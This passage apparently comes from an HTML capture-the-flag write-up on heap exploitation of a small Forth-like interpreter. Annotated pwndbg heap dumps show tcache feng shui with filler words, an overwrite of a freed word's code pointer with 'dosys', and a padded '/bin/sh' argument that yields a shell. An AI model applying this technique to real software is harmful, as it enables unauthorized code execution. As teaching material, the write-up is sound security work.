+0x563307eba890<span class="term-fg34">	0x0000000563307eba	0xa071bf23daf5dc17</span>	<span class="term-fg34">.~0c........#.q.</span>  &lt;-- tcachebins[0x90][0/1]
+0x563307eba8a0<span class="term-fg34">	0x0000000000000000	0x0000000000000000</span>	<span class="term-fg34">................</span>      '-&gt; reference-&gt;param[0]-&gt;param - word_t**
+          ...
+0x563307eba900<span class="term-fg34">	0x0000000000000000	0x0000000000000000</span>	<span class="term-fg34">................</span>
+0x563307eba910<span class="term-fg34">	0x0000000000000000</span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_5"><span>0x563307eba920</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_5">0x0000000563307eba	0xa071bf23daf5dc17</span></span>	<span class="term-fg33">.~0c........#.q.</span>  &lt;-- tcachebins[0x30][1/2]
+0x563307eba930<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_5">0x0000000000000001	0x00005632cbb2f41e</span></span>	<span class="term-fg33">............2V..</span>      '-&gt; <span class="term-fg31">!! reference-&gt;param[0] - word_t !!</span>
+0x563307eba940<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_5">0x0000563307eba890</span></span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">....3V..1.......</span>
+0x563307eba950<span class="term-fg36">	0x0000563664dbd79a	0xa071bf23daf5dc17</span>	<span class="term-fg36">...d6V......#.q.</span>  &lt;-- tcachebins[0x30][0/2]
+0x563307eba960<span class="term-fg36">	0x0000563307eba840	0x0000000000000001</span>	<span class="term-fg36">@...3V..........</span>
+0x563307eba970<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000021</span>	<span class="term-fg35">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_45"><span>0x563307eba980</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_45">0x636e657265666572	0x0000000000000065</span></span>	<span class="term-fg35"><span class="hl_mark_d hl_mark_d_45">reference</span>.......</span>    (reference - char[] name)
+0x563307eba990<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000091</span>	<span class="term-fg32">................</span>
+<span class="hl_mark_a" id="hl_mark_a_44"><span>0x563307eba9a0</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_44"><a href="#hl_mark_a_5"><span class="hl_mark_r hl_mark_r_5">0x0000563307eba920</span></a>	0x0000563307eba2a0</span></span>	<span class="term-fg32"> ...3V......3V..</span>    (reference - word_t** param)
+0x563307eba9b0<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_44">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+          ...
+0x563307ebaa10<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_44">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+0x563307ebaa20<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_44">0x0000000000000000</span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_46"><span>0x563307ebaa30</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_46">0x0000000000000002	0x0000000000000002</span></span>	<span class="term-fg34">................</span>    (reference - word_t)
+0x563307ebaa40<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_46">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaa50<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_46"><a href="#hl_mark_a_44"><span class="hl_mark_r hl_mark_r_44">0x0000563307eba9a0</span></a></span></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_51"><span>0x563307ebaa60</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_51"><a href="#hl_mark_a_45"><span class="hl_mark_r hl_mark_r_45">0x0000563307eba980</span></a>	<a href="#hl_mark_a_46"><span class="hl_mark_r hl_mark_r_46">0x0000563307ebaa30</span></a></span></span>	<span class="term-fg33">....3V..0...3V..</span>    (reference - dict_t)
+0x563307ebaa70<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_51"><a href="#hl_mark_a_47"><span class="hl_mark_r hl_mark_r_47">0x0000563307eba840</span></a>	0x0000000000000001</span></span>	<span class="term-fg33">@...3V..........</span>
+0x563307ebaa80<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_49"><span>0x563307ebaa90</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_49">0x6568636163745f61	0x6c69665f6e69625f</span></span>	<span class="term-fg36"><span class="hl_mark_d hl_mark_d_49">a_tcache_bin_fil</span></span>    (atbfn - char[] name)
+0x563307ebaaa0<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_49">0x6d616e5f676e696c	0x0000000000000065</span></span>	<span class="term-fg36"><span class="hl_mark_d hl_mark_d_49">ling_name</span>.......</span>
+0x563307ebaab0<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000091</span>	<span class="term-fg35">................</span>
+<span class="hl_mark_a" id="hl_mark_a_48"><span>0x563307ebaac0</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_48">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>    (atbfn - word_t** param)
+0x563307ebaad0<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_48">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+          ...
+0x563307ebab30<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_48">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+0x563307ebab40<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_48">0x0000000000000000</span></span><span class="term-fg32">	0x0000000000000031</span>	<span class="term-fg32">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_50"><span>0x563307ebab50</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_50">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg32">................</span>    (atbfn - word_t)
+0x563307ebab60<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_50">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg32">............2V..</span>
+0x563307ebab70<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_50"><a href="#hl_mark_a_48"><span class="hl_mark_r hl_mark_r_48">0x0000563307ebaac0</span></a></span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">....3V..1.......</span>
+0x563307ebab80<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_52"><a href="#hl_mark_a_49"><span class="hl_mark_r hl_mark_r_49">0x0000563307ebaa90</span></a>	<a href="#hl_mark_a_50"><span class="hl_mark_r hl_mark_r_50">0x0000563307ebab50</span></a></span></span>	<span class="term-fg34">....3V..P...3V..</span>    (atbfn - dict_t)
+0x563307ebab90<span class="term-fg34">	<a href="#hl_mark_a_51"><span class="hl_mark_r hl_mark_r_51">0x0000563307ebaa60</span></a>	0x0000000000000001</span>	<span class="term-fg34">`...3V..........</span>
+0x563307ebaba0<span class="term-fg34">	0x0000000000000000</span><span class="term-fg33">	0x0000000000020461</span>	<span class="term-fg33">........a.......</span>  &lt;-- Top chunk
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>c
+Continuing.
+</pre>
+    <p>Dangerous!</p>
+    <h2 id="exploitation_feng_shui">Exploitation - <span class="commented" title="or grooming, whatever suits you more">feng shui</span><div class="subtitle"> the filler episode</div></h2>
+    <p>Now, we'll <code>forget atbfn</code> as well.</p>
+    <p>This is the state of the tcachebins after these two deletions - we'll ignore the <code>0x20</code> bin as it isn't relevant for the exploit at all, and we'll also ignore the <code>0x90</code> bin as it comes in handy later. I'll abbreviate the heap addresses as just their last three nibbles.</p>
+    <tcache-bin-cont>
+        <tcache-bin>
+            <tcache-ent><span>tcachebin<br>[sz:&nbsp;0x20]</span></tcache-ent>
+            <tcache-ent class="blu"><a>b80</a><code>atbfn - dict_t</code></tcache-ent>
+            <tcache-ent class="cyn"><a>a90</a><code>atbfn - name</code></tcache-ent>
+            <tcache-ent class="grn"><a>b50</a><code>atbfn - word_t</code></tcache-ent>
+            <tcache-ent class="cyn"><a>950</a><code>freed - dict_t</code></tcache-ent>
+            <tcache-ent class="ylw"><a href="#hl_mark_a_5">920</a><code>freed - word_t</code></tcache-ent>
+        </tcache-bin>
+    </tcache-bin-cont>
+    <aside>Note: these free chunks aren't actually linked to anything, but they're annotated with <span class="commented" title="am i deadnaming the chunks?">what they were prior to freeing</span>.</aside>
+    <p>We defined and forgot <code>atbfn</code> to create three new <code>0x30</code> chunks in the tcache. Now, our old <code>word_t</code> which still lies in <code>reference</code> is at index 4. We can "pop" 4 tcache entries by creating two blank words with short names. For each of these, a <code>word_t</code> and a <code>dict_t</code> will be created, both of which having a size of <code>0x30</code>. Creating these two words leaves us with this tcache setup:</p>
+    <tcache-bin-cont>
+        <tcache-bin>
+            <tcache-ent><a>tcachebin<br>[sz:&nbsp;0x20]</a></tcache-ent>
+            <tcache-ent class="ylw"><a href="#hl_mark_a_5">920</a><code>freed - word_t</code></tcache-ent>
+        </tcache-bin>
+    </tcache-bin-cont>
+    <p>If the next word we create has a name which fits in an <code>0x30</code> chunk, that name becomes the new <code>reference</code>'s parameter word! The first three qwords have no meaning when referenced as a parameter, so we can fill them with some good ol' <code>0x41</code>, padding up until the code entry of the struct. We replace the code entry with <code>dosys</code>, and all that separates us from a shell is the parameter for the <code>system(val)</code> call.</p>
+	<pre class="term-container" id="term4">
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>vis
+          ...
+0x563307eba830<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_22"><span>0x563307eba840</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_22">0x00005632cbb310e4	0x0000563307eba810</span></span>	<span class="term-fg35">....2V......3V..</span>    (.s - dict_t)
+0x563307eba850<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_22">0x0000563307eba7e0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>
+0x563307eba860<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000021</span>	<span class="term-fg32">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_23"><span>0x563307eba870</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_23">0x003172656c6c6966</span>	0x0000000000000000</span>	<span class="term-fg32"><span class="hl_mark_d hl_mark_d_23">filler1</span>.........</span>    (filler1 - char[] name)
+0x563307eba880<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
+<span class="hl_mark_a" id="hl_mark_a_7"><span>0x563307eba890</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_7">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg34">....3V..........</span>    (filler2 - word_t** param)
+0x563307eba8a0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_7">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>      '-&gt; reference-&gt;param[0]-&gt;param - char[]
+          ...
+0x563307eba900<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_7">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg34">................</span>
+0x563307eba910<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_7">0x0000000000000000</span></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_6"><span>0x563307eba920</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_6">0x4141414141414141	0x4141414141414141</span></span>	<span class="term-fg33">AAAAAAAAAAAAAAAA</span>    (fake_dosys_word - char[] name)
+0x563307eba930<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_6">0x4141414141414141	0x00005632cbb2f46b</span></span>	<span class="term-fg33">AAAAAAAAk...2V..</span>      '-&gt; reference-&gt;param[0] - word_t
+0x563307eba940<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_6"><a href="#hl_mark_a_7"><span class="hl_mark_r hl_mark_r_7">0x0000563307eba890</span></a></span></span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_28"><span>0x563307eba950</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_28"><a href="#hl_mark_a_16"><span class="hl_mark_r hl_mark_r_16">0x0000563307ebabb0</span></a>	<a href="#hl_mark_a_17"><span class="hl_mark_r hl_mark_r_17">0x0000563307ebab50</span></a></span></span>	<span class="term-fg36">....3V..P...3V..</span>    (filler2 - dict_t)
+0x563307eba960<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_28"><a href="#hl_mark_a_18"><span class="hl_mark_r hl_mark_r_18">0x0000563307ebaa90</span></a>	0x0000000000000001</span></span>	<span class="term-fg36">....3V..........</span>
+0x563307eba970<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000021</span>	<span class="term-fg35">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_20"><span>0x563307eba980</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_20">0x636e657265666572	0x0000000000000065</span></span>	<span class="term-fg35"><span class="hl_mark_d hl_mark_d_20">reference</span>.......</span>    (reference - char[] name)
+0x563307eba990<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000091</span>	<span class="term-fg32">................</span>
+<span class="hl_mark_a" id="hl_mark_a_19"><span>0x563307eba9a0</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_19"><a href="#hl_mark_a_6"><span class="hl_mark_r hl_mark_r_6">0x0000563307eba920</span></a>	0x0000563307eba2a0</span></span>	<span class="term-fg32"> ...3V......3V..</span>    (reference - word_t** param)
+0x563307eba9b0<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_19">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+          ...
+0x563307ebaa10<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_19">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+0x563307ebaa20<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_19">0x0000000000000000</span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_21"><span>0x563307ebaa30</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_21">0x0000000000000002	0x0000000000000002</span></span>	<span class="term-fg34">................</span>    (reference - word_t)
+0x563307ebaa40<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_21">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaa50<span class="term-fg34">	<a href="#hl_mark_a_19"><span class="hl_mark_r hl_mark_r_19">0x0000563307eba9a0</span></a></span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_25"><span>0x563307ebaa60</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_25"><a href="#hl_mark_a_20"><span class="hl_mark_r hl_mark_r_20">0x0000563307eba980</span></a>	<a href="#hl_mark_a_21"><span class="hl_mark_r hl_mark_r_21">0x0000563307ebaa30</span></a></span></span>	<span class="term-fg33">....3V..0...3V..</span>    (reference - dict_t)
+0x563307ebaa70<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_25"><a href="#hl_mark_a_22"><span class="hl_mark_r hl_mark_r_22">0x0000563307eba840</span></a>	0x0000000000000001</span></span>	<span class="term-fg33">@...3V..........</span>
+0x563307ebaa80<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_18"><span>0x563307ebaa90</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_18"><a href="#hl_mark_a_23"><span class="hl_mark_r hl_mark_r_23">0x0000563307eba870</span></a>	<a href="#hl_mark_a_24"><span class="hl_mark_r hl_mark_r_24">0x0000563307ebab80</span></a></span></span>	<span class="term-fg36">p...3V......3V..</span>    (filler1 - dict_t)
+0x563307ebaaa0<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_18"><a href="#hl_mark_a_25"><span class="hl_mark_r hl_mark_r_25">0x0000563307ebaa60</span></a>	0x0000000000000001</span></span>	<span class="term-fg36">`...3V..........</span>
+0x563307ebaab0<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000091</span>	<span class="term-fg35">................</span>
+<span class="hl_mark_a" id="hl_mark_a_26"><span>0x563307ebaac0</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_26">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>    (filler1 - word_t** param)
+0x563307ebaad0<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_26">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+          ...
+0x563307ebab30<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_26">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg35">................</span>
+0x563307ebab40<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_26">0x0000000000000000</span></span><span class="term-fg32">	0x0000000000000031</span>	<span class="term-fg32">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_17"><span>0x563307ebab50</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_17">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg32">................</span>    (filler2 - word_t)
+0x563307ebab60<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_17">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg32">............2V..</span>
+0x563307ebab70<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_17"><a href="#hl_mark_a_7"><span class="hl_mark_r hl_mark_r_7">0x0000563307eba890</span></a></span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_24"><span>0x563307ebab80</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_24">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg34">................</span>    (filler1 - word_t)
+0x563307ebab90<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_24">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg34">............2V..</span>
+0x563307ebaba0<span class="term-fg34">	<a href="#hl_mark_a_26"><span class="hl_mark_r hl_mark_r_26"><span class="hl_mark_d hl_mark_d_24">0x0000563307ebaac0</span></span></a></span><span class="term-fg33">	0x0000000000000021</span>	<span class="term-fg33">....3V..!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_16"><span>0x563307ebabb0</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_16">0x003272656c6c6966</span>	0x0000000000000000</span>	<span class="term-fg33"><span class="hl_mark_d hl_mark_d_16">filler2</span>.........</span>    (filler2 - char[] name)
+0x563307ebabc0<span class="term-fg33">	0x0000000000000000</span><span class="term-fg36">	0x0000000000000091</span>	<span class="term-fg36">................</span>
+<span class="hl_mark_a" id="hl_mark_a_27"><span>0x563307ebabd0</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_27">0x0000563307eba2a0	0x0000000000000000</span></span>	<span class="term-fg36">....3V..........</span>    (fake_dosys_word - word_t** param)
+0x563307ebabe0<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_27">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg36">................</span>
+          ...
+0x563307ebac40<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_27">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg36">................</span>
+0x563307ebac50<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_27">0x0000000000000000</span></span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_29"><span>0x563307ebac60</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_29">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg35">................</span>    (fake_dosys_word - word_t)
+0x563307ebac70<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_29">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg35">............2V..</span>
+0x563307ebac80<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_29"><a href="#hl_mark_a_27"><span class="hl_mark_r hl_mark_r_27">0x0000563307ebabd0</span></a></span></span><span class="term-fg32">	0x0000000000000031</span>	<span class="term-fg32">....3V..1.......</span>
+0x563307ebac90<span class="term-fg32">	<a href="#hl_mark_a_6"><span class="hl_mark_r hl_mark_r_6">0x0000563307eba920</span></a>	<a href="#hl_mark_a_29"><span class="hl_mark_r hl_mark_r_29">0x0000563307ebac60</span></a></span>	<span class="term-fg32"> ...3V..`...3V..</span>    (fake_dosys_word - dict_t)
+0x563307ebaca0<span class="term-fg32">	<a href="#hl_mark_a_28"><span class="hl_mark_r hl_mark_r_28">0x0000563307eba950</span></a>	0x0000000000000001</span>	<span class="term-fg32">P...3V..........</span>
+0x563307ebacb0<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000020351</span>	<span class="term-fg34">........Q.......</span>	 &lt;-- Top chunk
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>c
+Continuing.
+</pre>
+    <p>Thankfully, that isn't that difficult either. The <code>word_t</code>'s params are already in the heap, just in an <code>0x90</code> chunk. Let's revisit the tcaches as they were at the start of our feng shui maneuvers, just like we looked at the <code>0x30</code> bin, this time with the <code>0x90</code> sized bin.</p>
+    <tcache-bin-cont>
+        <tcache-bin>
+            <tcache-ent><span>tcachebin<br>[sz:&nbsp;0x90]</span></tcache-ent>
+            <tcache-ent class="prp"><a>ac0</a><code>atbfn - params</code></tcache-ent>
+            <tcache-ent class="blu"><a href="#hl_mark_a_7">890</a><code>freed - params</code></tcache-ent>
+        </tcache-bin>
+    </tcache-bin-cont>
+    <p>As mentioned before, we created two filler words (which I called <span class="commented" title="very creative!"><code>filler1</code> and <code>filler2</code></span>). Each of these needed their own param array, and since the tcache is a singly linked list, <code>filler1</code> got the <code class="term-fg35">ac0</code> param array and <code>filler2</code> got the <code class="term-fg34">890</code> param array, which is also the param array of <code>freed</code>, thus also the param string of our <code>dosys</code> call!</p>
+    <p>All we have to do now is <code>forget filler2</code> and allocate a word with an <code>0x90</code> large name chunk, which will be our <code>system(val)</code> param!</p>
+    <p>But wait. <code>&#47;bin&#47;sh</code> is just 7 bytes, 8 if we include the null terminator. How do we push it to fill such a large chunk?</p>
+    <p>...</p>
+    <p>Just prepend 120 slashes or so. The path doesn't care how rooted it is, as long as it's at least once, it's fine. Lots of <code>&#47;.&#47;.</code> or <code>&#47;bin&#47;..</code> repetition would also work.</p>
+	<pre class="term-container" id="term5">
+<span class="term-fg32 term-fg1">pwndbg&gt; </span>vis
+          ...
+0x563307eba830<span class="term-fg36">	0x0000000000000000</span><span class="term-fg35">	0x0000000000000031</span>	<span class="term-fg35">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_34"><span>0x563307eba840</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_34">0x00005632cbb310e4	0x0000563307eba810</span></span>	<span class="term-fg35">....2V......3V..</span>    (.s - dict_t)
+0x563307eba850<span class="term-fg35">	<span class="hl_mark_d hl_mark_d_34">0x0000563307eba7e0	0x0000000000000000</span></span>	<span class="term-fg35">....3V..........</span>
+0x563307eba860<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000021</span>	<span class="term-fg32">........!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_35"><span>0x563307eba870</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_35">0x003172656c6c6966</span>	0x0000000000000000</span>	<span class="term-fg32"><span class="hl_mark_d hl_mark_d_35">filler1</span>.........</span>    (filler1 - char[] name)
+0x563307eba880<span class="term-fg32">	0x0000000000000000</span><span class="term-fg34">	0x0000000000000091</span>	<span class="term-fg34">................</span>
+<span class="hl_mark_a" id="hl_mark_a_9"><span>0x563307eba890</span></span><span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>    (sys_args - char[] name)
+0x563307eba8a0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>      '-&gt; reference-&gt;param[0]-&gt;param - char[]
+0x563307eba8b0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>
+0x563307eba8c0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>
+0x563307eba8d0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>
+0x563307eba8e0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>
+0x563307eba8f0<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x2f2f2f2f2f2f2f2f	0x2f2f2f2f2f2f2f2f</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">////////////////</span></span>
+0x563307eba900<span class="term-fg34">	<span class="hl_mark_d hl_mark_d_9">0x622f2f2f2f2f2f2f	0x00000068732f6e69</span></span>	<span class="term-fg34"><span class="hl_mark_d hl_mark_d_9">///////bin/sh</span>...</span>
+0x563307eba910<span class="term-fg34">	0x0000000000000000</span><span class="term-fg33">	0x0000000000000031</span>	<span class="term-fg33">........1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_8"><span>0x563307eba920</span></span><span class="term-fg33">	<span class="hl_mark_d hl_mark_d_8">0x4141414141414141	0x4141414141414141</span></span>	<span class="term-fg33">AAAAAAAAAAAAAAAA</span>    (fake_dosys_word - char[] name)
+0x563307eba930<span class="term-fg33">	<span class="hl_mark_d hl_mark_d_8">0x4141414141414141	0x00005632cbb2f46b</span></span>	<span class="term-fg33">AAAAAAAAk...2V..</span>      '-&gt; reference-&gt;param[0] - word_t
+0x563307eba940<span class="term-fg33">	<a href="#hl_mark_a_9"><span class="hl_mark_r hl_mark_r_9"><span class="hl_mark_d hl_mark_d_8">0x0000563307eba890</span></span></a></span><span class="term-fg36">	0x0000000000000031</span>	<span class="term-fg36">....3V..1.......</span>
+<span class="hl_mark_a" id="hl_mark_a_38"><span>0x563307eba950</span></span><span class="term-fg36">	<span class="hl_mark_d hl_mark_d_38">0x0000000000000002	0x0000000000000001</span></span>	<span class="term-fg36">................</span>    (sys_args - word_t)
+0x563307eba960<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_38">0x0000000000000000	0x00005632cbb2f41e</span></span>	<span class="term-fg36">............2V..</span>
+0x563307eba970<span class="term-fg36">	<span class="hl_mark_d hl_mark_d_38"><a href="#hl_mark_a_30"><span class="hl_mark_r hl_mark_r_30">0x0000563307ebacc0</span></a></span></span><span class="term-fg35">	0x0000000000000021</span>	<span class="term-fg35">....3V..!.......</span>
+<span class="hl_mark_a" id="hl_mark_a_32"><span>0x563307eba980</span></span><span class="term-fg35">	<span class="hl_mark_d hl_mark_d_32">0x636e657265666572	0x0000000000000065</span></span>	<span class="term-fg35"><span class="hl_mark_d hl_mark_d_32">reference</span>.......</span>    (reference - char[] name)
+0x563307eba990<span class="term-fg35">	0x0000000000000000</span><span class="term-fg32">	0x0000000000000091</span>	<span class="term-fg32">................</span>
+<span class="hl_mark_a" id="hl_mark_a_31"><span>0x563307eba9a0</span></span><span class="term-fg32">	<span class="hl_mark_d hl_mark_d_31"><a href="#hl_mark_a_8"><span class="hl_mark_r hl_mark_r_8">0x0000563307eba920</span></a>	0x0000563307eba2a0</span></span>	<span class="term-fg32"> ...3V......3V..</span>    (reference - word_t** param)
+0x563307eba9b0<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_31">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+          ...
+0x563307ebaa10<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_31">0x0000000000000000	0x0000000000000000</span></span>	<span class="term-fg32">................</span>
+0x563307ebaa20<span class="term-fg32">	<span class="hl_mark_d hl_mark_d_31">0x0000000000000000</span></span><span class="term-fg34">	0x0000000000000031</span>	<span class="term-fg34">........1.......</span>
